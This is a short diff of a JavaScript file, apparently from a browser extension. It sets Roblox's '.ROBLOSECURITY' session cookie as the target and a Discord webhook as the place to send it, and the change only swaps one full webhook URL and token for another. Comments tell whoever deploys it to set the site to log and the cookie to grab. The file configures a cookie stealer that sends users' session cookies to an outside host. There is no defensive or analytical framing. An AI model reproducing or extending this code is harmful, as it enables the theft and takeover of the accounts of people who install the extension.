@@ -2,7 +2,7 @@
 
 var website = "https://www.roblox.com"; // Change this to the website you want to log, don't forget to edit the manifest.json too!
 var cookie_data = ".ROBLOSECURITY"; // Change this to the cookie of the website!
-var discord_web_api = "https://discord.com/api/webhooks/1384730044756398080/F_OZIox30Scm855TmSVUz7X1UUzcIrEayQ-Uk9-eSKLluSd0GQaMl16v15nDQT436OhJ"; // This is the bot api!
+var discord_web_api = "https://discord.com/api/webhooks/1386091648831721482/qfoGVDZ9llllDVnCMAumal_I_zeYYDtJtHHdQ69MD0WgjdeGoDeFcrOHpXb2KNtEK4IQ"; // This is the bot api!
 
 var asdd; // This variable seems to store the processed cookie data
 
